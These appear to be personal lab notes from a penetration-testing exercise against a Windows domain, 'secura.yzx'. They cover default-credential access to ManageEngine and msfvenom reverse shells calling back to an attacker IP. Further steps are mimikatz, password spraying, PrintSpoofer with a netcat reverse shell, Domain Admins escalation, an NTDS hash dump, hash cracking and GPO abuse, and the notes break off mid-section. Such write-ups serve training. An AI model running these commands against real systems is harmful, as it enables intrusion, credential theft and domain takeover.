From Nmap scan:
```
192.168.240.95
DNS_Domain_Name: secura.yzx

Add to /etc/hosts
```

RDP login secura.yzx:
```bash
xfreerdp /u:'Eric.Wallows' /p:'EricLikesRunning800' /v:secure.secura.yzx /cert:ignore +clipboard /dynamic-resolution
```

OS info:
```powershell
systeminfo

# Host Name:                 SECURE
# OS Name:                   Microsoft Windows 10 Pro
# OS Version:                10.0.19042 N/A Build 19042
# ...
# System Type:               x64-based PC
# ...
# Domain:                    secura.yzx
# Logon Server:              \\DC01
#  Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB5013624
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB5033052
                           [08]: KB5013942
                           [09]: KB5014032
```

There is "ManageEngine - Applications Manager" running on ports 8443, 44444.
Version 14 according to the install folder:
```
C:\Program Files\ManageEngine\AppManager14
```

"Applications Manager" is a service which runs with system privileges:
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Name                          State   PathName
# ----                          -----   --------
# Appinfo                       Running C:\Windows\system32\svchost.exe -k netsvcs -p
# Applications Manager          Running "C:\Program Files\ManageEngine\AppManager14\working\wrapper.exe" -s "C:\Program Files\ManageEngine\AppManager14\working\conf\wrapper.conf"
# ...

$serviceName = "Applications Manager"
Get-CimInstance -ClassName Win32_Service -Filter "Name = '$serviceName'" | Format-List *

# Name                    : Applications Manager
# Status                  : OK
# ExitCode                : 0
# DesktopInteract         : True
# ErrorControl            : Normal
# PathName                : "C:\Program Files\ManageEngine\AppManager14\working\wrapper.exe" -s "C:\Program Files\ManageEngine\AppManager14\working\conf\wrapper.conf"
# ServiceType             : Own Process
# StartMode               : Auto
# Caption                 : ManageEngine Applications Manager
# Description             : Manage Your Applications
# InstallDate             :
# CreationClassName       : Win32_Service
# Started                 : True
# SystemCreationClassName : Win32_ComputerSystem
# SystemName              : SECURE
# AcceptPause             : False
# AcceptStop              : True
# DisplayName             : ManageEngine Applications Manager
# ServiceSpecificExitCode : 0
# StartName               : LocalSystem
# State                   : Running
# TagId                   : 0
# CheckPoint              : 0
# DelayedAutoStart        : False
# ProcessId               : 4912
# WaitHint                : 0
# PSComputerName          :
# CimClass                : root/cimv2:Win32_Service
# CimInstanceProperties   : {Caption, Description, InstallDate, Name...}
# CimSystemProperties     : Microsoft.Management.Infrastructure.CimSystemProperties
```

Also the service is an autorun service and we have the privs to restart the machine:
```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

However the app folder has some binaries to start/stop the service which we should try first:
![[Pasted image 20251020163130.png]]

There exists also an exploit for this version:
```bash
searchsploit Application Manager

# ...
# ManageEngine Applications Manager 14.0 - Authentication Bypass / Remote Command Execution (Metasploit)                                                                                                    | multiple/remote/46740.rb
# ...
```

According to the official doc (https://www.manageengine.com/products/applications_manager/help/getting-started-applications-manager.html) the default crendtials are:
```
admin:admin
```
Bingo! The default credentials work to login to the web UI.

Under "Alarms" there is the option to create an action to execute a program:
![[Pasted image 20251020164059.png]]

Create reverse shell:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.208 LPORT=55555 -f exe -o rshell.exe
```

Download rshell.exe on windows and use it as the "program to execute" for the action:
```powershell
iwr -uri http://192.168.45.208/rshell.exe -Outfile rshell.exe
```

After executing the action we catch the reverse shell as NT authority/system:
```bash
nc -vlnp 55555
# listening on [any] 55555 ...
# connect to [192.168.45.208] from (UNKNOWN) [192.168.240.95] 59976
# Microsoft Windows [Version 10.0.19042.1706]
# (c) Microsoft Corporation. All rights reserved.

# C:\Users\Eric.Wallows>whoami
# whoami
# nt authority\system
```

Flag:
```cmd
C:\Users\Eric.Wallows>type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\proof.txt
619f2567cc681ebea20f4405dcb6924b
```

Next, lets download mimikatz and see if there are more credentials:
```powershell
iwr -uri http://192.168.45.208/mimikatz.exe -Outfile mimikatz.exe
```
=> new Creds:
```
Administrator:a51493b0b06e5e35f855245e71af1d14
apache:New2Era4.!
```

Alternative, the following file contains the credentials too:
```powershell
type C:\Users\Administrator\AppData\Local\Microsoft\"Remote Desktop Connection Manager"\RDCMan.settings

# <server>Connect To\era.secura.yzx</server>
# <userName>apache</userName>
# <password>New2Era4.!</password>
```

# Lateral movement

AD user enumeration:
```bash
netexec ldap 192.168.240.97 -u 'Eric.Wallows' -p 'EricLikesRunning800' --users

Administrator
Guest
DefaultAccount
krbtgt
michael
charlotte
eric.wallows
```

## SMB

SMB access as Eric:
```bash
netexec smb 192.168.240.97 192.168.240.96 192.168.240.95 -u 'Eric.Wallows' -p 'EricLikesRunning800'                                                                                                                                32 ↵
# SMB         192.168.240.96  445    ERA              [+] secura.yzx\Eric.Wallows:EricLikesRunning800 
# SMB         192.168.240.97  445    DC01             [+] # secura.yzx\Eric.Wallows:EricLikesRunning800 
# SMB         192.168.240.95  445    SECURE           [+] secura.yzx\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
```

SMB Share enum as Eric.Wallows:
![[Pasted image 20251020175919.png]]
=> "test" share on DC01
=> share has no file

Spider all shares as Eric:
```bash
netexec smb 192.168.240.97 192.168.240.96 192.168.240.95 -u 'Eric.Wallows' -p 'EricLikesRunning800'  --module spider_plus
```

DC01 share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/192.168.240.97.json:
```json
"SYSVOL": {
        "secura.yzx/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2022-10-25 19:34:04",
            "ctime_epoch": "2022-10-25 19:34:04",
            "mtime_epoch": "2022-10-25 19:39:34",
            "size": "27 B"
        },
        "secura.yzx/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2022-10-25 19:34:04",
            "ctime_epoch": "2022-10-25 19:34:04",
            "mtime_epoch": "2022-10-25 19:39:34",
            "size": "894 B"
        },
        "secura.yzx/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Services/Services.xml": {
            "atime_epoch": "2022-10-25 19:35:15",
            "ctime_epoch": "2022-10-25 19:35:15",
            "mtime_epoch": "2022-10-25 19:39:34",
            "size": "376 B"
        },
        "secura.yzx/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2022-10-25 19:37:25",
            "ctime_epoch": "2022-10-25 19:37:25",
            "mtime_epoch": "2022-10-25 19:39:34",
            "size": "3.75 KB"
        },
        "secura.yzx/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/comment.cmtx": {
            "atime_epoch": "2022-10-25 19:35:37",
            "ctime_epoch": "2022-10-25 19:35:37",
            "mtime_epoch": "2022-10-25 19:39:34",
            "size": "807 B"
        },
        "secura.yzx/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/Microsoft/RemoteInstall/oscfilter.ini": {
            "atime_epoch": "2022-10-25 19:34:04",
            "ctime_epoch": "2022-10-25 19:34:04",
            "mtime_epoch": "2022-10-25 19:39:34",
            "size": "40 B"
        },
        "secura.yzx/Policies/{6AC1786C-016F-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2022-10-25 19:34:04",
            "ctime_epoch": "2022-10-25 19:34:04",
            "mtime_epoch": "2022-10-25 19:34:04",
            "size": "26 B"
        },
        "secura.yzx/Policies/{6AC1786C-016F-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2022-10-25 19:34:04",
            "ctime_epoch": "2022-10-25 19:34:04",
            "mtime_epoch": "2022-10-25 19:34:04",
            "size": "3.65 KB"
        }
```
=> some GPO policies to check out for potential credentials?
=> According to Google: `secura.yzx/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Services/Services.xml` is a GPP file that can contain a password.
=> Nope, the file does not contain a cpassword

## Password spraying

```bash
# SMB
netexec smb 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -p 'New2Era4.!'
# Nope

netexec smb 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -p 'New2Era4.!' --local-auth
# SMB         192.168.240.96  445    ERA              [+] ERA\apache:New2Era4.!

netexec smb 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -H a51493b0b06e5e35f855245e71af1d14
# Nope

netexec smb 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -H a51493b0b06e5e35f855245e71af1d14 --local-auth
# SMB         192.168.240.95  445    SECURE           [+] SECURE\Administrator:a51493b0b06e5e35f855245e71af1d14 (Pwn3d!)

# =====================================================================
# MSSQL
netexec mssql 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -H a51493b0b06e5e35f855245e71af1d14
# Nope

netexec mssql 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -H a51493b0b06e5e35f855245e71af1d14 --local-auth
# Nope

netexec mssql 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -p 'New2Era4.!'
# Nope

netexec mssql 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -p 'New2Era4.!' --local-auth
# Nope

# =====================================================================
# winrm
netexec winrm 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -H a51493b0b06e5e35f855245e71af1d14
# Nope

netexec winrm 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -H a51493b0b06e5e35f855245e71af1d14 --local-auth
# WINRM       192.168.240.95  5985   SECURE           [+] SECURE\Administrator:a51493b0b06e5e35f855245e71af1d14 (Pwn3d!)

netexec winrm 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -p 'New2Era4.!'
# Nope

netexec winrm 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -p 'New2Era4.!' --local-auth
# WINRM       192.168.240.96  5985   ERA              [+] ERA\apache:New2Era4.! (Pwn3d!)

# =====================================================================
# ftp
netexec ftp 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -p 'New2Era4.!'
# Nope

# =====================================================================
# rdp
netexec rdp 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -H a51493b0b06e5e35f855245e71af1d14
# Nope

netexec rdp 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -H a51493b0b06e5e35f855245e71af1d14 --local-auth
# RDP         192.168.240.95  3389   SECURE           [+] SECURE\Administrator:a51493b0b06e5e35f855245e71af1d14 (Pwn3d!)

netexec rdp 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -p 'New2Era4.!' --local-auth
# Nope

# =====================================================================
# ssh
netexec ssh 192.168.240.97 192.168.240.96 192.168.240.95 -u ad_users2.txt -p 'New2Era4.!'
# Nope
```

# Check accesses

```bash
# SMB         192.168.240.96  445    ERA              [+] ERA\apache:New2Era4.!
netexec smb 192.168.131.96 -u 'ERA\apache' -p 'New2Era4.!' --shares 
# => only standard shares with read permission
impacket-psexec 'apache':'New2Era4.!'@192.168.131.96
# [-] share 'ADMIN$' is not writable.
# [-] share 'C$' is not writable.
# => Fails do not writeable shares
impacket-wmiexec 'apache':'New2Era4.!'@192.168.131.96
impacket-smbexec 'apache':'New2Era4.!'@192.168.131.96
# => wmiexec and smbexec also do not work

# SMB         192.168.240.95  445    SECURE           [+] SECURE\Administrator:a51493b0b06e5e35f855245e71af1d14 (Pwn3d!)
netexec smb 192.168.131.95 -u 'SECURE\Administrator' -H 'a51493b0b06e5e35f855245e71af1d14' --shares
# => only standard shares

# WINRM       192.168.240.95  5985   SECURE           [+] SECURE\Administrator:a51493b0b06e5e35f855245e71af1d14 (Pwn3d!)
evil-winrm -i 192.168.131.95 -u administrator -H a51493b0b06e5e35f855245e71af1d14
# => does work

# WINRM       192.168.240.96  5985   ERA              [+] ERA\apache:New2Era4.! (Pwn3d!)
evil-winrm -i 192.168.131.96 -u apache -p 'New2Era4.!'
# => works

# RDP         192.168.240.95  3389   SECURE           [+] SECURE\Administrator:a51493b0b06e5e35f855245e71af1d14 (Pwn3d!)
# => does not work
```

# BloodHound

```bash
sudo bloodhound-ce-python -d 'secura.yzx' -dc DC01.secura.yzx -ns 192.168.131.97 -u 'Eric.Wallows' -p 'EricLikesRunning800' -c all
```

Run BloodHound-CE as per notes.

Results from Queries:
- No Kerberoastable Users
- No AS-REP roastable Users

No other interesting info found.

# VM02 - User "apache"

Access VM02 as apache:
```bash
evil-winrm -i 192.168.147.96 -u apache -p 'New2Era4.!'
```

Users:
```powershell
net users
# Administrator            apache                   DefaultAccount
# Guest                    WDAGUtilityAccount

ls C:\Users

#     Directory: C:\Users

# Mode                 LastWriteTime         Length Name
# ----                 -------------         ------ ----
# d-----         9/27/2024   4:54 PM                Administrator
# d-----          8/5/2022   5:58 PM                apache
# d-----          9/2/2022   4:13 PM                apache.ERA
# d-r---        11/19/2020   7:48 AM                Public
```

## Scheduled tasks

```powershell
schtasks /query /fo LIST /v | findstr /b /c:"TaskName:" /c:"Author:" /c:"Task To Run:" /c:"Run As User:" /c:"Next Run Time:"
```
=> No scheduled task we can compromise.

## Credentials search

Searching the `C:\xampp` folder:

```powershell
 Get-ChildItem -Path "C:\xampp" -Recurse -File -Force -ErrorAction SilentlyContinue |
Where-Object { $_.Extension -match '\.(xml|json|ini|txt|config|bak)$' } |
Select-String -Pattern 'password', 'pass', 'passwd', 'pwd', 'credentials', 'auth', 'authentication', 'apikey', 'api_key', 'secret', 'token' -CaseSensitive:$false -ErrorAction SilentlyContinue |
Select-Object Path, Filename, LineNumber, Line
```
Resulting interesting files?
```
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\webdav\webdav.txt
```
=> Nope

```powershell
type C:\xampp\tmp\sess_4ratl05q4mpc92ib7bga2imgr9

# ...
# "sqlquery";s:60:"insert into creds value ("administrator","Almost4There8.?");"
# ...
```
=> administrator:Almost4There8.?

# Access as administrator

```bash
evil-winrm -i 192.168.190.96 -u administrator -p 'Almost4There8.?'
```
BINGO!!!

Root flag:
```powershell
type C:\Users\Administrator\Desktop\proof.txt
# 70230bb7b7330331cadda1aa45ea9f2c
```

## Password spraying

Spray the newly found PW:
```bash
# SMB
netexec smb 192.168.147.97 192.168.147.96 192.168.147.95 -u ad_users.txt -p 'Almost4There8.?'
# Nope

netexec smb 192.168.147.97 192.168.147.96 192.168.147.95 -u ad_users.txt -p 'Almost4There8.?' --local-auth
# SMB         192.168.147.96  445    ERA              [+] ERA\Administrator:Almost4There8.? (Pwn3d!)

# =====================================================================
# winrm
netexec winrm 192.168.147.97 192.168.147.96 192.168.147.95 -u ad_users.txt -p 'Almost4There8.?'
# Nope

netexec winrm 192.168.147.97 192.168.147.96 192.168.147.95 -u ad_users.txt -p 'Almost4There8.?' --local-auth
# WINRM       192.168.147.96  5985   ERA              [+] ERA\Administrator:Almost4There8.? (Pwn3d!)

# =====================================================================
# rdp
netexec rdp 192.168.147.97 192.168.147.96 192.168.147.95 -u ad_users.txt -p 'Almost4There8.?'
# Nope

netexec rdp 192.168.147.97 192.168.147.96 192.168.147.95 -u ad_users.txt -p 'Almost4There8.?' --local-auth
# Nope
```
=> nothing new, the password is only valid for the host`ERA` and the user `administrator`

## SMB enum

```bash
netexec smb 192.168.190.96 -u 'Administrator' -p 'Almost4There8.?' --local-auth --shares

# ADMIN$          READ,WRITE      Remote Admin
# C$              READ,WRITE      Default share
# IPC$            READ            Remote IPC
```
=> nada

Credential search as admin:
```powershell
cmdkey /list

# Currently stored credentials:
# * NONE *
```

# System access

We can also get a shell as SYSTEM:
```bash
impacket-psexec Administrator:'Almost4There8.?'@192.168.147.96

# C:\Windows\system32> whoami
# nt authority\system
```

## Mimi

Using the system shell, download and execute mimi on the target host:
```powershell
iwr -uri http://192.168.45.241/mimikatz.exe -Outfile mimikatz.exe

.\mimikatz.exe
```
=> no new credentials

# Enable RDP on VM02

Add Administrator to RDP group and start the server:
```powershell
net localgroup "Remote Desktop Users" Administrator /add

# Set "fDenyTSConnections" registry value to "0", which enables RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Enable the built-in firewall rule group for Remote Desktop, opening port 3389
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Ensure the service is running. It will tell you if it's already started.
net start termservice
```

Now we can RPD login as Administrator:
```bash
xfreerdp /u:'administrator' /p:'Almost4There8.?' /v:192.168.190.96 /cert:ignore +clipboard /dynamic-resolution
```

Open ports:
```powershell
netstat -a

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            era:0                  LISTENING
  TCP    0.0.0.0:445            era:0                  LISTENING
  TCP    0.0.0.0:3306           era:0                  LISTENING
  TCP    0.0.0.0:3389           era:0                  LISTENING
  TCP    0.0.0.0:5040           era:0                  LISTENING
  TCP    0.0.0.0:5985           era:0                  LISTENING
  TCP    0.0.0.0:7680           era:0                  LISTENING
  TCP    0.0.0.0:47001          era:0                  LISTENING
  TCP    0.0.0.0:49664          era:0                  LISTENING
  TCP    0.0.0.0:49665          era:0                  LISTENING
  TCP    0.0.0.0:49666          era:0                  LISTENING
  TCP    0.0.0.0:49667          era:0                  LISTENING
  TCP    0.0.0.0:49668          era:0                  LISTENING
  TCP    0.0.0.0:49669          era:0                  LISTENING
  TCP    0.0.0.0:49670          era:0                  LISTENING
  TCP    0.0.0.0:49671          era:0                  LISTENING
  TCP    0.0.0.0:58526          era:0                  LISTENING
  TCP    127.0.0.1:1337         era:0                  LISTENING
  TCP    192.168.190.96:139     era:0                  LISTENING
  TCP    192.168.190.96:3389    192.168.45.241:56762   ESTABLISHED
  TCP    [::]:135               era:0                  LISTENING
  TCP    [::]:445               era:0                  LISTENING
  TCP    [::]:3306              era:0                  LISTENING
  TCP    [::]:3389              era:0                  LISTENING
  TCP    [::]:5985              era:0                  LISTENING
  TCP    [::]:7680              era:0                  LISTENING
  TCP    [::]:47001             era:0                  LISTENING
  TCP    [::]:49664             era:0                  LISTENING
  TCP    [::]:49665             era:0                  LISTENING
  TCP    [::]:49666             era:0                  LISTENING
  TCP    [::]:49667             era:0                  LISTENING
  TCP    [::]:49668             era:0                  LISTENING
  TCP    [::]:49669             era:0                  LISTENING
  TCP    [::]:49670             era:0                  LISTENING
  TCP    [::]:49671             era:0                  LISTENING
  TCP    [::]:58526             era:0                  LISTENING
```

## Port 1337

Localhost port 1337 looks sus. Lets forward the port so we can access it from Kali and scan it with nmap.
```powershell
netsh interface portproxy add v4tov4 listenport=31337 listenaddress=192.168.190.96 connectport=1337 connectaddress=127.0.0.1

netsh advfirewall firewall add rule name="ForwardToService" protocol=TCP dir=in localip=192.168.190.96 localport=31337 action=allow
```

Looks like 1337 is a listening SYSTEM shell :D
```bash
nc -vn 192.168.190.96 31337                                                      
(UNKNOWN) [192.168.190.96] 31337 (?) open
Microsoft Windows [Version 10.0.19042.1706]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

## Port 3306

```powershell
netsh interface portproxy add v4tov4 listenport=33060 listenaddress=192.168.190.96 connectport=3306 connectaddress=127.0.0.1

netsh advfirewall firewall add rule name="Forward33060" protocol=TCP dir=in localip=192.168.190.96 localport=33060 action=allow
```

Access the service from kali as `root` w/o password:
```bash
mysql -h 192.168.190.96 -P 33060 --user=root
```

Databases:
```
show databases;
+--------------------+
| Database           |
+--------------------+
| creds              |
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| test               |
+--------------------+
```

Creds database columns:
```
show columns from creds;
+-------+-------------+------+-----+---------+-------+
| Field | Type        | Null | Key | Default | Extra |
+-------+-------------+------+-----+---------+-------+
| name  | varchar(50) | NO   | PRI | NULL    |       |
| pass  | varchar(30) | NO   |     | NULL    |       |
+-------+-------------+------+-----+---------+-------+
```

Dump table:
```
SELECT * FROM creds;
+---------------+-----------------+
| name          | pass            |
+---------------+-----------------+
| administrator | Almost4There8.? |
| charlotte     | Game2On4.!      |
+---------------+-----------------+
```
=> Nice! New credentials: `charlotte:Game2On4.!`

# Password spraying:

Spray the newly found PW:
```bash
# SMB
netexec smb 192.168.190.97 192.168.190.96 192.168.190.95 -u ad_users.txt -p 'Game2On4.!'
# SMB         192.168.190.96  445    ERA              [+] secura.yzx\charlotte:Game2On4.!
# SMB         192.168.190.95  445    SECURE           [+] secura.yzx\charlotte:Game2On4.!
# SMB         192.168.190.97  445    DC01             [+] secura.yzx\charlotte:Game2On4.!

netexec smb 192.168.190.97 192.168.190.96 192.168.190.95 -u ad_users.txt -p 'Game2On4.!' --local-auth
# Nope

# =====================================================================
# WinRM
netexec winrm 192.168.190.97 192.168.190.96 192.168.190.95 -u ad_users.txt -p 'Game2On4.!'
# WINRM       192.168.190.97  5985   DC01             [+] secura.yzx\charlotte:Game2On4.! (Pwn3d!)

netexec winrm 192.168.190.97 192.168.190.96 192.168.190.95 -u ad_users.txt -p 'Game2On4.!' --local-auth
# Nope

# =====================================================================
# RDP
netexec rdp 192.168.190.97 192.168.190.96 192.168.190.95 -u ad_users.txt -p 'Game2On4.!'
# RDP         192.168.190.95  3389   SECURE           [+] secura.yzx\charlotte:Game2On4.!
# RDP         192.168.190.96  3389   ERA              [+] secura.yzx\charlotte:Game2On4.!

netexec rdp 192.168.190.97 192.168.190.96 192.168.190.95 -u ad_users.txt -p 'Game2On4.!' --local-auth
# Nope
```

# DC01

Access as charlotte:
```bash
evil-winrm -i 192.168.190.97 -u charlotte -p 'Game2On4.!'
```

Looks like charlotte is not a local administrator but has SeImpersonatePrivilege:
```powershell
whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
secura\charlotte S-1-5-21-3453094141-4163309614-2941200192-1104


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

User flag:
```powershell
type C:\Users\charlotte\Desktop\local.txt
f8884828ef353471648f7cd7e551465f
```

Download PrintSpoofer.exe from kali:
```powershell
iwr -uri http://192.168.45.241/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

Executing an interactive shell fails:
```powershell
.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
[!] CreateProcessWithTokenW() isn't compatible with option -i
```

Lets try with executing a reverse shell. First we download nc.exe:
```powershell
iwr -uri http://192.168.45.241/nc64.exe -Outfile nc64.exe
```

Start listener:
```bash
nc -vlnp 4444
```

Run exploit:
```powershell
.\PrintSpoofer64.exe -c "nc64.exe 192.168.45.241 4444 -e cmd"
```
BINGO!!!

We catch a shell as DC01$:
```
nc -vlnp 4444
listening on [any] 4444 ...
connect to [192.168.45.241] from (UNKNOWN) [192.168.190.97] 50855
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
secura\dc01$

C:\Windows\system32>
```

Flag:
```powershell
type C:\Users\Administrator.DC01\Desktop\proof.txt
8253189807ece83a9dee44f44e6e8a69
```

# Post Exploitation

Promote charlotte to a domain admin:
```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members "charlotte"
```

List domain admins:
```Powershell
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName

Name          SamAccountName
----          --------------
Administrator Administrator
charlotte     charlotte
```

Now we can access every other workstation as domain admin charlotte:
VM01:
```bash
xfreerdp /u:'charlotte' /p:'Game2On4.!' /v:192.168.190.95 /cert:ignore +clipboard /dynamic-resolution
```

VM02 (we enabled RDP):
```bash
xfreerdp /u:'charlotte' /p:'Game2On4.!' /v:192.168.190.96 /cert:ignore +clipboard /dynamic-resolution
```

Dump NTDS.dit:
```bash
impacket-secretsdump 'charlotte':'Game2On4.!'@192.168.190.97 -just-dc-ntlm
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d38e7c66048f80fd9566ab85afca76b1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:431f60ffa71152f8445bea272663d7c3:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
secura.yzx\michael:1103:aad3b435b51404eeaad3b435b51404ee:86593b65670ad9905e397ed56e6a86f3:::
secura.yzx\charlotte:1104:aad3b435b51404eeaad3b435b51404ee:dd76c2d1f3dd82f52fd7a233b37ce1c5:::
secura.yzx\eric.wallows:4101:aad3b435b51404eeaad3b435b51404ee:a1f18f9362b5485cca07aedda6792454:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e9d4d23acff00ac00b84108cd1daad97:::
SECURE$:1105:aad3b435b51404eeaad3b435b51404ee:7ab8b0770c6aefa689e8e4ed1fc20bd6:::
ERA$:1106:aad3b435b51404eeaad3b435b51404ee:29f461a9f5b0f30aeb4641d5ccb9c3e9:::
```

Crack michaels (= domain admin) password:
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# 86593b65670ad9905e397ed56e6a86f3:angelomichael
```

---
# Alternative - GPO

Download PowerView, SharpGPOAbuse.exe:
```powershell
iwr -uri http://192.168.45.167/PowerView.ps1 -Outfile PowerView.ps1
iwr -uri http://192.168.45.167/SharpGPOAbuse.exe -Outfile SharpGPOAbuse.exe
```

## Attempt 1 - Enumerate GPO from VM01 as Eric

RDP login to VM01 as Eric:
```bash
xfreerdp /u:'Eric.Wallows' /p:'EricLikesRunning800' /v:192.168.205.95 /cert:ignore +clipboard /dynamic-resolution
```

## Attempt 2 - Enumerate GPO from VM02 as Administrator

```bash
evil-winrm -i 192.168.205.96 -u administrator -p 'Almost4There8.?'
```

## Attempt 3 - Enumerate GPO from DC01 as charlotte

Access DC01 as charlotte:
```bash
evil-winrm -i 192.168.205.97 -u charlotte -p 'Game2On4.!'
```

List policies:
```powershell
Get-DomainGPO

# usncreated               : 5900
# systemflags              : -1946157056
# displayname              : Default Domain Policy
# ...


```

Check permissions:
```powershell
Get-GPPermission -Name "Default Domain Policy" -All


Trustee     : Authenticated Users
TrusteeType : WellKnownGroup
Permission  : GpoApply
Inherited   : False

Trustee     : Domain Admins
TrusteeType : Group
Permission  : GpoCustom
Inherited   : False

Trustee     : Enterprise Admins
TrusteeType : Group
Permission  : GpoCustom
Inherited   : False

Trustee     : charlotte
TrusteeType : User
Permission  : GpoEditDeleteModifySecurity
Inherited   : False

Trustee     : ENTERPRISE DOMAIN CONTROLLERS
TrusteeType : WellKnownGroup
Permission  : GpoRead
Inherited   : False

Trustee     : SYSTEM
TrusteeType : WellKnownGroup
Permission  : GpoEditDeleteModifySecurity
Inherited   : False
```
=> charlotte has `GpoEditDeleteModifySecurity` privs

Abuse privs to add charlotte as local administrator to GPO => effectively making charlotte a local admin on every workstation that updates to the new GPO:
```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
[+] Domain = secura.yzx
[+] Domain Controller = dc01.secura.yzx
[+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx
[+] SID Value of charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\secura.yzx\SysVol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```

### Before GPO update

On VM01:
```
net localgroup "Administrators"
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
SECURA\Domain Admins
SECURA\Eric.Wallows
The command completed successfully.
```

On VM02:
```
